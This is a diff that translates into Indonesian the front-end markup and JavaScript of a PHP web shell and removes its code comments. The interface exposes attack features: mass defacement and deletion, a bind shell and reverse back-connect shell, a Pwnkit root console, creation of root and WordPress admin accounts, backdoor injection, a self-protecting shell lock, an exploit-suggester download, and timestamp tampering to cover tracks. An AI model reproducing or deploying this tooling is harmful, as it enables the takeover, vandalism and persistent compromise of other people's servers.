 </div>
-<div class="modal fade" id="massDefaceModal" tabindex="-1"><div class="modal-dialog modal-lg"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-exclamation-diamond"></i> Mass Tools</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><div id="massOutput" class="output-console mb-3 d-none"></div><p>Mass Deface</p><form id="massDefaceForm"><div class="mb-2"><input class="form-control" type="text" name="d_dir" value="<?php echo htmlspecialchars($path); ?>" required></div><div class="mb-2"><input class="form-control" type="text" name="d_file" placeholder="index.html" required></div><div class="mb-2"><textarea class="form-control" rows="3" name="script" placeholder="Hacked" required></textarea></div><div class="form-check form-check-inline"><input class="form-check-input" type="radio" name="tipe" id="onedir" value="onedir" checked><label class="form-check-label" for="onedir">One Dir</label></div><div class="form-check form-check-inline"><input class="form-check-input" type="radio" name="tipe" id="mass" value="mass"><label class="form-check-label" for="mass">Recursive</label></div><button type="submit" class="btn btn-main w-100 mt-2">Start Deface</button></form><hr><p class="mt-3">Mass Delete</p><form id="massDeleteForm"><div class="mb-2"><input class="form-control" type="text" name="d_dir" value="<?php echo htmlspecialchars($path); ?>" required></div><div class="mb-2"><input class="form-control" type="text" name="d_file" placeholder="index.html" required></div><button type="submit" class="btn btn-danger w-100 mt-2">Start Deleting</button></form></div></div></div></div>
-<div class="modal fade" id="networkModal" tabindex="-1"><div class="modal-dialog modal-lg"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-hdd-network"></i> Network Tools</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><div id="networkOutput" class="output-console mb-3 d-none"></div><nav><div class="nav nav-tabs" id="nav-tab" role="tablist"><button class="nav-link active" data-bs-toggle="tab" data-bs-target="#nav-bind">Bind Port</button><button class="nav-link" data-bs-toggle="tab" data-bs-target="#nav-back">Back-Connect</button></div></nav><div class="tab-content pt-3"><div class="tab-pane fade show active" id="nav-bind"><form class="network-form"><h6>Bind Port to /bin/sh [Perl]</h6><div class="input-group"><input class="form-control" type="text" name="port" placeholder="6969" required><button class="btn btn-main" type="submit" name="bpl">Execute</button></div></form></div><div class="tab-pane fade" id="nav-back"><form class="network-form"><h6>Back-Connect</h6><div class="mb-2"><label class="form-label">Server IP:</label><input class="form-control" type="text" name="server" value="<?php echo ia(); ?>" required></div><div class="mb-2"><label class="form-label">Port:</label><input class="form-control" type="text" name="port" placeholder="6969" required></div><div class="input-group"><select class="form-select" name="bc"><option value="perl">Perl</option><option value="python">Python</option></select><button class="btn btn-main" type="submit">Execute</button></div></form></div></div></div></div></div></div>
-<div class="modal fade" id="rootConsoleModal" tabindex="-1"><div class="modal-dialog modal-xl"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-terminal-plus"></i> Command Console</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><div id="pwnkitStatus" class="alert alert-secondary">Checking Pwnkit status...</div><div id="rootCmdOutput" class="output-console mb-3"># Output will appear here...</div><form id="rootCmdForm"><div class="input-group"><span class="input-group-text" id="promptIndicator">#</span><input type="text" class="form-control" id="rootCmdInput" placeholder="id" required><button class="btn btn-main" type="submit">Execute</button></div></form></div></div></div></div>
-<div class="modal fade" id="securityModal" tabindex="-1"><div class="modal-dialog modal-lg"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-shield-lock"></i> Security Tools</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><div id="securityOutput" class="output-console mb-3 d-none"></div><h6 class="text-white-50">Backdoor Destroyer</h6><p><small>This will overwrite the <code>.htaccess</code> file in the document root to block access to all PHP files except this shell and common CMS files. Use with caution.</small></p><button type="button" class="btn btn-danger w-100 mb-4" id="destroyerBtn">Activate Backdoor Destroyer</button><hr><h6 class="text-white-50">Lock File / Shell</h6><p><small>Creates a background process to ensure a file remains locked (read-only) and is restored if deleted.</small></p><form id="lockItemForm"><div class="input-group"><input type="text" class="form-control" name="file_to_lock" placeholder="filename.php (full path)" required><button type="submit" class="btn btn-main">Lock Item</button></div></form></div></div></div></div>
-<div class="modal fade" id="usersModal" tabindex="-1"><div class="modal-dialog modal-lg"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-people-fill"></i> User Management</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><div id="usersOutput" class="output-console mb-3 d-none"></div><nav><div class="nav nav-tabs" id="nav-user-tab"><button class="nav-link active" data-bs-toggle="tab" data-bs-target="#nav-root-user">Root User</button><button class="nav-link" data-bs-toggle="tab" data-bs-target="#nav-wp-user">WordPress User</button></div></nav><div class="tab-content pt-3"><div class="tab-pane fade show active" id="nav-root-user"><p><small>Add a new root user to the system. Requires a vulnerable server (check with Root Console).</small></p><form id="addRootUserForm"><div class="mb-2"><label class="form-label">Username</label><input type="text" name="username" class="form-control" required></div><div class="mb-2"><label class="form-label">Password</label><input type="text" name="password" class="form-control" required></div><button type="submit" class="btn btn-main w-100">Add Root User</button></form></div><div class="tab-pane fade" id="nav-wp-user"><p><small>Add a new administrator user to a WordPress installation.</small></p><form id="addWpUserForm"><div class="input-group mb-2"><input type="text" class="form-control" id="wpConfigPath" placeholder="Auto-detect or enter path to wp-config.php"><button type="button" class="btn btn-outline-secondary" id="parseWpConfigBtn">Parse</button></div><div class="row"><div class="col-md-6 mb-2"><input type="text" id="db_host" name="db_host" class="form-control" placeholder="DB Host" required></div><div class="col-md-6 mb-2"><input type="text" id="db_name" name="db_name" class="form-control" placeholder="DB Name" required></div><div class="col-md-6 mb-2"><input type="text" id="db_user" name="db_user" class="form-control" placeholder="DB User" required></div><div class="col-md-6 mb-2"><input type="text" id="db_pass" name="db_pass" class="form-control" placeholder="DB Password"></div><hr class="my-2"><div class="col-md-6 mb-2"><input type="text" name="wp_user" class="form-control" placeholder="New WP Username" required></div><div class="col-md-6 mb-2"><input type="text" name="wp_pass" class="form-control" placeholder="New WP Password" required></div></div><button type="submit" class="btn btn-main w-100 mt-2">Add WordPress Admin</button></form></div></div></div></div></div></div>
-<div class="modal fade" id="scanRootModal" tabindex="-1"><div class="modal-dialog modal-xl"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-bug"></i> Root & SUID Scanner / Exploit Suggester</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><nav><div class="nav nav-tabs" id="nav-scan-tab"><button class="nav-link active" data-bs-toggle="tab" data-bs-target="#nav-autoscan">Auto Root Scan</button><button class="nav-link" data-bs-toggle="tab" data-bs-target="#nav-suidscan">Scan SUID</button><button class="nav-link" data-bs-toggle="tab" data-bs-target="#nav-exploitsuggester">Exploit Suggester</button></div></nav><div class="tab-content pt-3"><div class="tab-pane fade show active" id="nav-autoscan"><p><small>Attempts to run known local privilege escalation exploits to check for vulnerabilities.</small></p><button type="button" class="btn btn-main w-100 mb-3" id="startAutoScanBtn">Start Auto Scan</button><div id="autoScanOutput" class="output-console mb-3 d-none"></div></div><div class="tab-pane fade" id="nav-suidscan"><p><small>Scans for files with SUID (Set User ID) bit set, which can sometimes be exploited for privilege escalation.</small></p><button type="button" class="btn btn-main w-100 mb-3" id="startSuidScanBtn">Start SUID Scan</button><div id="suidScanOutput" class="output-console mb-3 d-none"></div></div><div class="tab-pane fade" id="nav-exploitsuggester"><p><small>Downloads and runs the Linux Exploit Suggester script to find potential exploits based on kernel version and installed software.</small></p><button type="button" class="btn btn-main w-100 mb-3" id="startExploitSuggesterBtn">Start Exploit Suggester</button><div id="exploitSuggesterOutput" class="output-console mb-3 d-none"></div></div></div></div></div></div></div>
-<div class="modal fade" id="touchModal" tabindex="-1"><div class="modal-dialog"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-clock"></i> Change File Timestamp</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><form id="touchForm"><div class="mb-3"><label for="touchFileName" class="form-label">File:</label><input type="text" class="form-control" id="touchFileName" name="file_to_touch_name" readonly></div><div class="mb-3"><label for="touchDateTime" class="form-label">New Date & Time (YYYY-MM-DD HH:MM:SS):</label><input type="text" class="form-control" id="touchDateTime" name="datetime_value" placeholder="Example: 2024-01-01 12:00:00" required></div><button type="submit" class="btn btn-main w-100">Change Timestamp</button></form></div></div></div></div>
-<div class="modal fade" id="chmodModal" tabindex="-1"><div class="modal-dialog"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-key"></i> Change Permissions</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><form id="chmodForm"><div class="mb-3"><label for="chmodItemPath" class="form-label">Item Path:</label><input type="text" class="form-control" id="chmodItemPath" name="target_path" readonly></div><div class="mb-3"><label for="chmodPerms" class="form-label">New Permissions (Octal, e.g., 0755):</label><input type="text" class="form-control" id="chmodPerms" name="perms_octal" pattern="[0-7]{4}" required></div><button type="submit" class="btn btn-main w-100">Change Permissions</button></form></div></div></div></div>
+<div class="modal fade" id="massDefaceModal" tabindex="-1"><div class="modal-dialog modal-lg"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-exclamation-diamond"></i> Alat Massal</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><div id="massOutput" class="output-console mb-3 d-none"></div><p>Deface Massal</p><form id="massDefaceForm"><div class="mb-2"><input class="form-control" type="text" name="d_dir" value="<?php echo htmlspecialchars($path); ?>" required></div><div class="mb-2"><input class="form-control" type="text" name="d_file" placeholder="index.html" required></div><div class="mb-2"><textarea class="form-control" rows="3" name="script" placeholder="Diretas" required></textarea></div><div class="form-check form-check-inline"><input class="form-check-input" type="radio" name="tipe" id="onedir" value="onedir" checked><label class="form-check-label" for="onedir">Satu Direktori</label></div><div class="form-check form-check-inline"><input class="form-check-input" type="radio" name="tipe" id="mass" value="mass"><label class="form-check-label" for="mass">Rekursif</label></div><button type="submit" class="btn btn-main w-100 mt-2">Mulai Deface</button></form><hr><p class="mt-3">Hapus Massal</p><form id="massDeleteForm"><div class="mb-2"><input class="form-control" type="text" name="d_dir" value="<?php echo htmlspecialchars($path); ?>" required></div><div class="mb-2"><input class="form-control" type="text" name="d_file" placeholder="index.html" required></div><button type="submit" class="btn btn-danger w-100 mt-2">Mulai Menghapus</button></form></div></div></div></div>
+<div class="modal fade" id="networkModal" tabindex="-1"><div class="modal-dialog modal-lg"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-hdd-network"></i> Alat Jaringan</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><div id="networkOutput" class="output-console mb-3 d-none"></div><nav><div class="nav nav-tabs" id="nav-tab" role="tablist"><button class="nav-link active" data-bs-toggle="tab" data-bs-target="#nav-bind">Ikat Port</button><button class="nav-link" data-bs-toggle="tab" data-bs-target="#nav-back">Koneksi-Balik</button></div></nav><div class="tab-content pt-3"><div class="tab-pane fade show active" id="nav-bind"><form class="network-form"><h6>Ikat Port ke /bin/sh [Perl]</h6><div class="input-group"><input class="form-control" type="text" name="port" placeholder="6969" required><button class="btn btn-main" type="submit" name="bpl">Eksekusi</button></div></form></div><div class="tab-pane fade" id="nav-back"><form class="network-form"><h6>Koneksi-Balik</h6><div class="mb-2"><label class="form-label">IP Server:</label><input class="form-control" type="text" name="server" value="<?php echo ia(); ?>" required></div><div class="mb-2"><label class="form-label">Port:</label><input class="form-control" type="text" name="port" placeholder="6969" required></div><div class="input-group"><select class="form-select" name="bc"><option value="perl">Perl</option><option value="python">Python</option></select><button class="btn btn-main" type="submit">Eksekusi</button></div></form></div></div></div></div></div></div>
+<div class="modal fade" id="rootConsoleModal" tabindex="-1"><div class="modal-dialog modal-xl"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-terminal-plus"></i> Konsol Perintah</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><div id="pwnkitStatus" class="alert alert-secondary">Memeriksa status Pwnkit...</div><div id="rootCmdOutput" class="output-console mb-3"># Output akan muncul di sini...</div><form id="rootCmdForm"><div class="input-group"><span class="input-group-text" id="promptIndicator">#</span><input type="text" class="form-control" id="rootCmdInput" placeholder="id" required><button class="btn btn-main" type="submit">Eksekusi</button></div></form></div></div></div></div>
+<div class="modal fade" id="securityModal" tabindex="-1"><div class="modal-dialog modal-lg"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-shield-lock"></i> Alat Keamanan</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><div id="securityOutput" class="output-console mb-3 d-none"></div><h6 class="text-white-50">Penghancur Pintu Belakang</h6><p><small>Ini akan menimpa berkas <code>.htaccess</code> di root dokumen untuk memblokir akses ke semua berkas PHP kecuali shell ini dan berkas CMS umum. Gunakan dengan hati-hati.</small></p><button type="button" class="btn btn-danger w-100 mb-4" id="destroyerBtn">Aktifkan Penghancur Pintu Belakang</button><hr><h6 class="text-white-50">Kunci Berkas / Shell</h6><p><small>Membuat proses latar belakang untuk memastikan berkas tetap terkunci (hanya baca) dan dipulihkan jika dihapus.</small></p><form id="lockItemForm"><div class="input-group"><input type="text" class="form-control" name="file_to_lock" placeholder="nama_berkas.php (jalur lengkap)" required><button type="submit" class="btn btn-main">Kunci Item</button></div></form></div></div></div></div>
+<div class="modal fade" id="usersModal" tabindex="-1"><div class="modal-dialog modal-lg"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-people-fill"></i> Manajemen Pengguna</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><div id="usersOutput" class="output-console mb-3 d-none"></div><nav><div class="nav nav-tabs" id="nav-user-tab"><button class="nav-link active" data-bs-toggle="tab" data-bs-target="#nav-root-user">Pengguna Root</button><button class="nav-link" data-bs-toggle="tab" data-bs-target="#nav-wp-user">Pengguna WordPress</button></div></nav><div class="tab-content pt-3"><div class="tab-pane fade show active" id="nav-root-user"><p><small>Tambahkan pengguna root baru ke sistem. Membutuhkan server yang rentan (periksa dengan Konsol Root).</small></p><form id="addRootUserForm"><div class="mb-2"><label class="form-label">Nama Pengguna</label><input type="text" name="username" class="form-control" required></div><div class="mb-2"><label class="form-label">Kata Sandi</label><input type="text" name="password" class="form-control" required></div><button type="submit" class="btn btn-main w-100">Tambah Pengguna Root</button></form></div><div class="tab-pane fade" id="nav-wp-user"><p><small>Tambahkan pengguna administrator baru ke instalasi WordPress.</small></p><form id="addWpUserForm"><div class="input-group mb-2"><input type="text" class="form-control" id="wpConfigPath" placeholder="Deteksi Otomatis atau masukkan jalur ke wp-config.php"><button type="button" class="btn btn-outline-secondary" id="parseWpConfigBtn">Parse</button></div><div class="row"><div class="col-md-6 mb-2"><input type="text" id="db_host" name="db_host" class="form-control" placeholder="Host DB" required></div><div class="col-md-6 mb-2"><input type="text" id="db_name" name="db_name" class="form-control" placeholder="Nama DB" required></div><div class="col-md-6 mb-2"><input type="text" id="db_user" name="db_user" class="form-control" placeholder="Pengguna DB" required></div><div class="col-md-6 mb-2"><input type="text" id="db_pass" name="db_pass" class="form-control" placeholder="Kata Sandi DB"></div><hr class="my-2"><div class="col-md-6 mb-2"><input type="text" name="wp_user" class="form-control" placeholder="Nama Pengguna WP Baru" required></div><div class="col-md-6 mb-2"><input type="text" name="wp_pass" class="form-control" placeholder="Kata Sandi WP Baru" required></div></div><button type="submit" class="btn btn-main w-100 mt-2">Tambah Admin WordPress</button></form></div></div></div></div></div></div>
+<div class="modal fade" id="scanRootModal" tabindex="-1"><div class="modal-dialog modal-xl"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-bug"></i> Pemindai Root & SUID / Saran Eksploitasi</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><nav><div class="nav nav-tabs" id="nav-scan-tab"><button class="nav-link active" data-bs-toggle="tab" data-bs-target="#nav-autoscan">Pindai Root Otomatis</button><button class="nav-link" data-bs-toggle="tab" data-bs-target="#nav-suidscan">Pindai SUID</button><button class="nav-link" data-bs-toggle="tab" data-bs-target="#nav-exploitsuggester">Saran Eksploitasi</button></div></nav><div class="tab-content pt-3"><div class="tab-pane fade show active" id="nav-autoscan"><p><small>Mencoba menjalankan eksploitasi peningkatan hak istimewa lokal yang dikenal untuk memeriksa kerentanan.</small></p><button type="button" class="btn btn-main w-100 mb-3" id="startAutoScanBtn">Mulai Pindai Otomatis</button><div id="autoScanOutput" class="output-console mb-3 d-none"></div></div><div class="tab-pane fade" id="nav-suidscan"><p><small>Memindai berkas dengan bit SUID (Set User ID) yang disetel, yang kadang-kadang dapat dieksploitasi untuk peningkatan hak istimewa.</small></p><button type="button" class="btn btn-main w-100 mb-3" id="startSuidScanBtn">Mulai Pindai SUID</button><div id="suidScanOutput" class="output-console mb-3 d-none"></div></div><div class="tab-pane fade" id="nav-exploitsuggester"><p><small>Mengunduh dan menjalankan skrip Linux Exploit Suggester untuk menemukan potensi eksploitasi berdasarkan versi kernel dan perangkat lunak yang terinstal.</small></p><button type="button" class="btn btn-main w-100 mb-3" id="startExploitSuggesterBtn">Mulai Saran Eksploitasi</button><div id="exploitSuggesterOutput" class="output-console mb-3 d-none"></div></div></div></div></div></div></div>
+<div class="modal fade" id="touchModal" tabindex="-1"><div class="modal-dialog"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-clock"></i> Ubah Stempel Waktu Berkas</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><form id="touchForm"><div class="mb-3"><label for="touchFileName" class="form-label">Berkas:</label><input type="text" class="form-control" id="touchFileName" name="file_to_touch_name" readonly></div><div class="mb-3"><label for="touchDateTime" class="form-label">Tanggal & Waktu Baru (YYYY-MM-DD HH:MM:SS):</label><input type="text" class="form-control" id="touchDateTime" name="datetime_value" placeholder="Contoh: 2024-01-01 12:00:00" required></div><button type="submit" class="btn btn-main w-100">Ubah Stempel Waktu</button></form></div></div></div></div>
+<div class="modal fade" id="chmodModal" tabindex="-1"><div class="modal-dialog"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-key"></i> Ubah Izin</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><form id="chmodForm"><div class="mb-3"><label for="chmodItemPath" class="form-label">Jalur Item:</label><input type="text" class="form-control" id="chmodItemPath" name="target_path" readonly></div><div class="mb-3"><label for="chmodPerms" class="form-label">Izin Baru (Oktal, misal, 0755):</label><input type="text" class="form-control" id="chmodPerms" name="perms_octal" pattern="[0-7]{4}" required></div><button type="submit" class="btn btn-main w-100">Ubah Izin</button></form></div></div></div></div>
 <div class="modal fade" id="massDateTimeChangeModal" tabindex="-1">
     <div class="modal-dialog">
         <div class="modal-content">
             <div class="modal-header">
-                <h5 class="modal-title"><i class="bi bi-calendar-range"></i> Mass Date/Time Change</h5>
+                <h5 class="modal-title"><i class="bi bi-calendar-range"></i> Ubah Tanggal/Waktu Massal</h5>
                 <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
             </div>
             <div class="modal-body">
                 <div id="massDateTimeChangeOutput" class="output-console mb-3 d-none"></div>
                 <form id="massDateTimeChangeForm">
                     <div class="mb-3">
-                        <label for="massDateTimeChangeDir" class="form-label">Target Directory:</label>
+                        <label for="massDateTimeChangeDir" class="form-label">Direktori Target:</label>
                         <input type="text" class="form-control" id="massDateTimeChangeDir" name="target_dir" value="<?php echo htmlspecialchars($path); ?>" required>
                     </div>
                     <div class="mb-3">
-                        <label for="massDateTimeValue" class="form-label">New Date & Time (YYYY-MM-DD HH:MM:SS):</label>
-                        <input type="text" class="form-control" id="massDateTimeValue" name="datetime_value" placeholder="Example: 2024-01-01 12:00:00" required>
-                    </div>
-                    <button type="submit" class="btn btn-main w-100">Apply Mass Change</button>
+                        <label for="massDateTimeValue" class="form-label">Tanggal & Waktu Baru (YYYY-MM-DD HH:MM:SS):</label><input type="text" class="form-control" id="massDateTimeValue" name="datetime_value" placeholder="Contoh: 2024-01-01 12:00:00" required></div><button type="submit" class="btn btn-main w-100">Terapkan Perubahan Massal</button>
                 </form>
             </div>
         </div>
@@ -1363,7 +1291,7 @@ document.addEventListener('DOMContentLoaded', function() {
     const currentPath = '<?php echo htmlspecialchars($path, ENT_QUOTES); ?>';
     const scriptUrl = '<?php echo htmlspecialchars($_SERVER['PHP_SELF'], ENT_QUOTES); ?>';
     let isPwnkitVulnerable = false;
-    let currentConsoleMode = 'user'; // 'user' or 'root' (forced by button)
+    let currentConsoleMode = 'user';
 
     function showToast(message, type = 'success') {
         const toastId = 'toast-' + Date.now();
@@ -1402,7 +1330,7 @@ document.addEventListener('DOMContentLoaded', function() {
     }
 
     const modals = {};
-    const modalIds = ['uploadModal', 'createFileModal', 'createFolderModal', 'injectModal', 'editorModal', 'massDefaceModal', 'networkModal', 'rootConsoleModal', 'securityModal', 'usersModal', 'scanRootModal', 'touchModal', 'chmodModal', 'massDateTimeChangeModal']; // Add new modal ID
+    const modalIds = ['uploadModal', 'createFileModal', 'createFolderModal', 'injectModal', 'editorModal', 'massDefaceModal', 'networkModal', 'rootConsoleModal', 'securityModal', 'usersModal', 'scanRootModal', 'touchModal', 'chmodModal', 'massDateTimeChangeModal'];
     modalIds.forEach(id => {
         const el = document.getElementById(id);
         if (el) {
@@ -1423,9 +1351,7 @@ document.addEventListener('DOMContentLoaded', function() {
     attachClickListener('btnNetwork', 'networkModal');
     attachClickListener('btnInjector', 'injectModal');
     attachClickListener('btnMassTools', 'massDefaceModal');
-    attachClickListener('btnMassDateTimeChange', 'massDateTimeChangeModal'); // Attach new button
-    // Renamed for clarity in console options
-    // attachClickListener('btnRootConsole', 'rootConsoleModal'); // This one will be handled specifically below
+    attachClickListener('btnMassDateTimeChange', 'massDateTimeChangeModal');
     attachClickListener('btnUsers', 'usersModal');
     attachClickListener('btnSecurity', 'securityModal');
     attachClickListener('btnScanRoot', 'scanRootModal');
@@ -1440,11 +1366,10 @@ document.addEventListener('DOMContentLoaded', function() {
     const deleteSelectedBtn = document.getElementById('deleteSelectedBtn');
     if(deleteSelectedBtn) {
         deleteSelectedBtn.addEventListener('click', () => {
-            const files = Array.from(document.querySelectorAll('.file-checkbox:checked')).map(cb => cb.value); // These are now full paths
-            // Replace confirm() with custom modal if needed
-            if(confirm(`Delete ${files.length} item(s)?`)) {
+            const files = Array.from(document.querySelectorAll('.file-checkbox:checked')).map(cb => cb.value);
+            if(confirm(`Hapus ${files.length} item?`)) {
                 const fd = new FormData(); fd.append('action', 'delete_multiple'); files.forEach(f => fd.append('files[]', f));
-                ajaxRequest(fd, d => { showToast(`Deleted: ${d.success.length}. Failed: ${d.errors.length}.`,d.errors.length > 0 ? 'danger' : 'success'); if(d.success.length) setTimeout(()=>location.reload(),1e3);});
+                ajaxRequest(fd, d => { showToast(`Dihapus: ${d.success.length}. Gagal: ${d.errors.length}.`,d.errors.length > 0 ? 'danger' : 'success'); if(d.success.length) setTimeout(()=>location.reload(),1e3);});
             }
         });
     }
@@ -1460,7 +1385,7 @@ document.addEventListener('DOMContentLoaded', function() {
                 showToast(d.message,d.status==='ok'?'success':'danger');
                 if(d.status==='ok'){
                     modals.createFileModal.hide();
-                    editItem(d.file_path); // Open the newly created file in editor mode
+                    editItem(d.file_path);
                 }
             });
         });
@@ -1471,27 +1396,26 @@ document.addEventListener('DOMContentLoaded', function() {
         createFolderForm.addEventListener('submit',e=>{e.preventDefault(); const fd=new FormData(); fd.append('action','create_folder'); fd.append('name',document.getElementById('newFolderName').value); ajaxRequest(fd,d=>{showToast(d.message,d.status==='ok'?'success':'danger');if(d.status==='ok'){modals.createFolderModal.hide(); setTimeout(()=>location.reload(),1e3);}});});
     }
 
-    window.renameItem=itemPath=>{const n=prompt(`New name for "${basename(itemPath)}":`, basename(itemPath));if(n&&n!==basename(itemPath)){const fd=new FormData();fd.append('action','rename');fd.append('old',itemPath);fd.append('new',n);ajaxRequest(fd,d=>{showToast(d.message,d.status==='ok'?'success':'danger');if(d.status==='ok')setTimeout(()=>location.reload(),1e3);});}};
+    window.renameItem=itemPath=>{const n=prompt(`Nama baru untuk "${basename(itemPath)}":`, basename(itemPath));if(n&&n!==basename(itemPath)){const fd=new FormData();fd.append('action','rename');fd.append('old',itemPath);fd.append('new',n);ajaxRequest(fd,d=>{showToast(d.message,d.status==='ok'?'success':'danger');if(d.status==='ok')setTimeout(()=>location.reload(),1e3);});}};
     
     let currentEditingFile='';
     const editorContent = document.getElementById('editorContent');
     const editorFileName = document.getElementById('editorFileName');
     const saveFileBtn = document.getElementById('saveFileBtn');
 
-    // Disabling "View File" feature that was erroring, will just show content as plain text
     window.viewItem = file => editItem(file, true);
 
     window.editItem = (file, readOnly = false) => {
-        currentEditingFile = file; // file is now the full path
-        editorFileName.textContent = (readOnly ? 'Viewing: ' : 'Editing: ') + basename(file);
+        currentEditingFile = file;
+        editorFileName.textContent = (readOnly ? 'Melihat: ' : 'Mengedit: ') + basename(file);
 
         editorContent.readOnly = readOnly;
         saveFileBtn.style.display = readOnly ? 'none' : 'block';
-        editorContent.value = 'Loading...';
+        editorContent.value = 'Memuat...';
 
         const fd = new FormData();
         fd.append('action', 'get_content');
-        fd.append('file', file); // Send full path
+        fd.append('file', file);
         ajaxRequest(fd, d => {
             if (d.status === 'ok') {
                 editorContent.value = d.content;
@@ -1503,7 +1427,7 @@ document.addEventListener('DOMContentLoaded', function() {
     };
     
     if(saveFileBtn) {
-        saveFileBtn.addEventListener('click',()=>{const fd=new FormData();fd.append('action','save_content');fd.append('file',currentEditingFile); // Send full path
+        saveFileBtn.addEventListener('click',()=>{const fd=new FormData();fd.append('action','save_content');fd.append('file',currentEditingFile);
         fd.append('content',editorContent.value);ajaxRequest(fd,d=>{showToast(d.message,d.status==='ok'?'success':'danger');if(d.status==='ok')modals.editorModal.hide();});});
     }
 
@@ -1525,7 +1449,7 @@ document.addEventListener('DOMContentLoaded', function() {
     const injectForm = document.getElementById('injectForm');
     if(injectForm) {
         injectForm.addEventListener('submit',e=>{e.preventDefault();
-        if(confirm('Are you sure you want to inject this backdoor?')) {
+        if(confirm('Apakah Anda yakin ingin menyuntikkan pintu belakang ini?')) {
             const fd=new FormData(e.target);fd.append('action','inject_backdoor');ajaxRequest(fd,d=>{
                 showToast(d.message,d.status==='ok'?'success':'danger');
                 if(d.status==='ok') {
@@ -1534,12 +1458,10 @@ document.addEventListener('DOMContentLoaded', function() {
             });
         }});
     }
-    // When modal is closed, hide instructions message again
     document.getElementById('injectModal').addEventListener('hidden.bs.modal', function () {
         document.getElementById('injectSuccessMessage').classList.add('d-none');
     });
 
-    // Remote Upload Form
     const remoteUploadForm = document.getElementById('remoteUploadForm');
     if(remoteUploadForm) {
         remoteUploadForm.addEventListener('submit', e => {
@@ -1557,23 +1479,22 @@ document.addEventListener('DOMContentLoaded', function() {
     }
 
 
-    document.querySelectorAll('.network-form').forEach(f=>f.addEventListener('submit',e=>{e.preventDefault();const o=document.getElementById('networkOutput');o.innerHTML='Executing...';o.classList.remove('d-none');const fd=new FormData(e.target);fd.append('action','network');ajaxRequest(fd,d=>o.innerText=d.output);}));
+    document.querySelectorAll('.network-form').forEach(f=>f.addEventListener('submit',e=>{e.preventDefault();const o=document.getElementById('networkOutput');o.innerHTML='Mengeksekusi...';o.classList.remove('d-none');const fd=new FormData(e.target);fd.append('action','network');ajaxRequest(fd,d=>o.innerText=d.output);}));
     
     const massDefaceForm = document.getElementById('massDefaceForm');
     if(massDefaceForm) {
-        massDefaceForm.addEventListener('submit',e=>{e.preventDefault();const o=document.getElementById('massOutput');o.innerHTML='Processing...';o.classList.remove('d-none');const fd=new FormData(e.target);fd.append('action','mass_deface');ajaxRequest(fd,d=>o.innerText=d.output);});
+        massDefaceForm.addEventListener('submit',e=>{e.preventDefault();const o=document.getElementById('massOutput');o.innerHTML='Memproses...';o.classList.remove('d-none');const fd=new FormData(e.target);fd.append('action','mass_deface');ajaxRequest(fd,d=>o.innerText=d.output);});
     }
 
     const massDeleteForm = document.getElementById('massDeleteForm');
     if(massDeleteForm) {
-        massDeleteForm.addEventListener('submit',e=>{e.preventDefault();const o=document.getElementById('massOutput');o.innerHTML='Processing...';o.classList.remove('d-none');const fd=new FormData(e.target);fd.append('action','mass_delete');ajaxRequest(fd,d=>o.innerText=d.output);});
+        massDeleteForm.addEventListener('submit',e=>{e.preventDefault();const o=document.getElementById('massOutput');o.innerHTML='Memproses...';o.classList.remove('d-none');const fd=new FormData(e.target);fd.append('action','mass_delete');ajaxRequest(fd,d=>o.innerText=d.output);});
     }
     
-    // Console Options Logic
     const btnTerminal = document.getElementById('btnTerminal');
     if (btnTerminal) {
         btnTerminal.addEventListener('click', () => {
-            currentConsoleMode = 'user'; // Set mode to user
+            currentConsoleMode = 'user';
             modals.rootConsoleModal.show();
         });
     }
@@ -1581,7 +1502,7 @@ document.addEventListener('DOMContentLoaded', function() {
     const btnRootShell = document.getElementById('btnRootShell');
     if (btnRootShell) {
         btnRootShell.addEventListener('click', () => {
-            currentConsoleMode = 'root'; // Set mode to force root check
+            currentConsoleMode = 'root';
             modals.rootConsoleModal.show();
         });
     }
@@ -1594,34 +1515,32 @@ document.addEventListener('DOMContentLoaded', function() {
             const rootCmdInput = document.getElementById('rootCmdInput');
             const rootCmdOutput = document.getElementById('rootCmdOutput');
 
-            // Clear previous output and input
-            rootCmdOutput.innerHTML = '# Output will appear here...';
+            rootCmdOutput.innerHTML = '# Output akan muncul di sini...';
             rootCmdInput.value = '';
 
             if (currentConsoleMode === 'root') {
-                statusEl.textContent = 'Attempting to gain root access...';
